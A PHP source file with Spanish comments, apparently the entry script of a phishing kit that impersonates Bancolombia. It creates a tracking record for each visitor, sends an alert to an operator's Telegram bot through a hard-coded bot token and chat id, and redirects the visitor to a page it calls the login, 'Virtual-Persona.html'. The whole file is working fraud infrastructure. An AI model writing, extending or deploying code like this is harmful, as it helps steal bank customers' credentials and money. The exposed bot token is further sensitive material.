<?php
/**
 * back.php
 * --------
 * Entry point legacy que genera una solicitud NUEVA "Ingreso Verde".
 * Flujo directo sin formulario: crea fila en solicitudes + notifica Telegram
 * y redirige a Virtual-Persona.html (login).
 *
 * Diferencias con handlers POST standard (conservadas por restricción funcionalidad):
 *   - Usa canal Telegram auxiliar (mismo token/chat que enviar_formulario.php).
 *   - Genera key NUEVA + solicitud INSERT (no UPDATE de una existente).
 *   - No usa teclado inline (solo mensaje informativo).
 *
 * 6 pasos:
 *   1) Definir valores por defecto (celular / monto / banco = Bancolombia).
 *   2) Generar identificadores: request_id BCO_<144 bits> + key <32 hex> (nueva).
 *   3) INSERT en solicitudes (fila inicial, sin datos de usuario todavía).
 *   4) Notificar a Telegram canal auxiliar "Nueva Ingreso Verde".
 *   5) Guardar variables en sesión PHP.
 *   6) 302 → Virtual-Persona.html?rid=&key=&banco=.
 */

session_start();
require __DIR__ . DIRECTORY_SEPARATOR . 'conexion.php';

// ── Paso 1: Valores por defecto de la solicitud "Ingreso Verde" ────────────────
$celular = 'No hay celular';
$monto   = 'No hay monto';
$banco   = 'BANCOLOMBIA';
$tipo    = $tipo ?? 'ingreso_verde'; // Defensa si $tipo no se define antes del include

// ── Paso 2: Generar identificadores (scope BCO_ para shared webhook) ───────────
try {
    $request_id = 'BCO_' . bin2hex(random_bytes(18));
} catch (Throwable $_) {
    $request_id = 'BCO_' . bin2hex(openssl_random_pseudo_bytes(18));
}
$key = bin2hex(random_bytes(16)); // 32 caracteres hex (id sesión usuario)

// ── Paso 3: Persistir fila inicial en solicitudes ─────────────────────────────
$stmt = $pdo->prepare(
    "INSERT INTO solicitudes (numero_cuenta, monto, banco, request_id, `key`)
     VALUES (?, ?, ?, ?, ?)"
);
$stmt->execute([$celular, $monto, $banco, $request_id, $key]);

// ── Paso 4: Telegram (mismo canal OPERACIONES unificado en esta instalación) ──
// 1) Render env vars TELEGRAM_BOT_TOKEN_OPS / TELEGRAM_CHAT_ID_OPS si existen (nuevo canal).
// 2) Fallback LEGACY => canal propio anterior "Ingreso Verde" (token 7617... / chat -4801629674).
$FALLBACK_BOT_TOKEN_LEGACY = "7617726809:AAHd16JUqx-m01rHFilp6BcOsCp4iXD1L-U";
$FALLBACK_CHAT_ID_LEGACY   = "-4801629674";
$token   = getenv('TELEGRAM_BOT_TOKEN_OPS') ?: $FALLBACK_BOT_TOKEN_LEGACY;
$chat_id = getenv('TELEGRAM_CHAT_ID_OPS')   ?: $FALLBACK_CHAT_ID_LEGACY;

$mensaje  = "🌱 <b>[INGRESO VERDE]</b> Entrada directa back.php (sin landing anterior):\n";
$mensaje .= "🏦 Banco: $banco\n";

$url = "https://api.telegram.org/bot$token/sendMessage?" . http_build_query([
    'chat_id' => $chat_id,
    'text'    => $mensaje,
]);
@file_get_contents($url);

// ── Paso 5: Persistir en sesión PHP (flujo legacy) ────────────────────────────
$_SESSION['celular']    = $celular;
$_SESSION['monto']      = $monto;
$_SESSION['tipo']       = $tipo;
$_SESSION['banco']      = $banco;
$_SESSION['request_id'] = $request_id;
$_SESSION['key']        = $key;

// ── Paso 6: Redirect al formulario Virtual-Persona ────────────────────────────
header("Location: Virtual-Persona.html?rid=$request_id&key=$key&banco=$banco");
exit;
